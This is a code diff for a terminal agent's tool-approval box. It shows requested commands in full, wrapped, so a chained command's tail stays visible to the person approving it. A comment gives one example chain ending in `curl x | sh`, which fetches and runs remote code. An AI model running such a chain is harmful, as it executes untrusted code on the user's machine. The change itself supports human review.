@@ -822,6 +822,34 @@ function queuedLines(text: string, width: number): string[] {
   ]
 }
 
+/**
+ * The approval box's measurements, worked out in one place for the layout (which reserves its rows) and the
+ * drawing (which fills them).
+ *
+ * What is asked is shown whole, wrapped under the title. It used to be cut at the box's edge, and the part of
+ * a chained command that matters is usually its end: `npm install && npm test && curl x | sh` showed the
+ * harmless start. Only one too long for the window loses its middle, saying how much; its end always shows.
+ */
+function approvalBox(asking: NonNullable<typeof pending>, cols: number, rows: number) {
+  const asked = askedFor(asking.tool, asking.detail).replace(/\s+/g, " ").trim()
+  const lead = " " + (asking.from ? asking.from + " subagent: " : "") + "allow " + asking.tool
+  const worded = decisionHints(asking.tool, asking.cover)
+  const choices = decisionsFor(asking.tool)
+  const hints = choices.map((d) => worded[d.id])
+  // One width for every row, padded after colouring - displayWidth skips escape sequences, so the box lines
+  // up whatever colour the text is. As wide as the words need, but never wider than the terminal.
+  const labelWidth = Math.max(...choices.map((d) => displayWidth(d.label))) + 2
+  const oneLine = lead + (asked ? ": " + asked : "") + "?"
+  const inner = Math.max(24, Math.min(Math.max(3 + labelWidth + Math.max(...hints.map((hint) => displayWidth(hint))), displayWidth(oneLine)) + 1, cols - 6))
+  // On one line when it fits, as it always was; under the title, wrapped, when it does not.
+  const fits = displayWidth(oneLine) <= inner
+  const title = fits ? oneLine : lead + ":"
+  const wrapped = asked && !fits ? wrapWords(asked, inner - 3) : []
+  const room = Math.max(3, rows - 14)
+  const askedRows = wrapped.length <= room ? wrapped : [...wrapped.slice(0, room - 2), "… " + (wrapped.length - room + 1) + " more lines not shown here …", wrapped.at(-1)!]
+  return { title, choices, hints, labelWidth, inner, askedRows }
+}
+
 function drawEntry(entry: Entry, width: number): string[] {
   const out: string[] = []
   if (entry.kind === "tool") {
@@ -998,7 +1026,7 @@ function draw() {
    */
   const footer = {
     prompt: promptHeight,
-    pending: pending && !input ? decisionsFor(pending.tool).length + 3 : !pending && asking && !asking.typing ? asking.question.options.length + 4 + wrapWords(asking.question.question, Math.max(23, cols - 7)).length : 0,
+    pending: pending && !input ? approvalBox(pending, cols, rows).askedRows.length + decisionsFor(pending.tool).length + 3 :!pending && asking && !asking.typing ? asking.question.options.length + 4 + wrapWords(asking.question.question, Math.max(23, cols - 7)).length : 0,
     queued: false,
     images: Boolean(pendingImages.length && !secret),
     scrolled: false,
@@ -1138,17 +1166,7 @@ function draw() {
     // cover. It used to say only "allow this?", with the command down in the
     // input line, and the session hint said "calls like this" - which told you
     // nothing once an approval covered one command rather than the whole tool.
-    const asked = askedFor(pending.tool, pending.detail).replace(/\s+/g, " ")
-    const title = " " + (pending.from ? pending.from + " subagent: " : "") + "allow " + pending.tool + ": " + asked + "?"
-    const worded = decisionHints(pending.tool, pending.cover)
-    const choices = decisionsFor(pending.tool)
-    const hints = choices.map((d) => worded[d.id])
-    // One width for every row, padded after colouring - displayWidth skips
-    // escape sequences, so the box lines up whatever colour the text is. As
-    // wide as the words need, but never wider than the terminal.
-    const labelWidth = Math.max(...choices.map((d) => displayWidth(d.label))) + 2
-    const wanted = Math.max(3 + labelWidth + Math.max(...hints.map((hint) => displayWidth(hint))), displayWidth(title)) + 1
-    const inner = Math.max(24, Math.min(wanted, cols - 6))
+    const { title, choices, hints, labelWidth, inner, askedRows } = approvalBox(pending, cols, rows)
 
     body.push(theme.border + "  " + "╭" + "─".repeat(inner) + "╮" + ansi.reset)
     body.push(
@@ -1156,6 +1174,9 @@ function draw() {
         theme.gold + padToWidth(truncateToWidth(title, inner), inner) + ansi.reset +
         theme.border + "│" + ansi.reset,
     )
+    for (const line of askedRows) {
+      body.push(theme.border + "  │" + ansi.reset + theme.text + padToWidth("   " + line, inner) + ansi.reset + theme.border + "│" + ansi.reset)
+    }
     for (const [index, choice] of choices.entries()) {
       const active = index === pendingChoice
       const marker = active ? theme.goblin + " ❯ " + ansi.reset : "   "
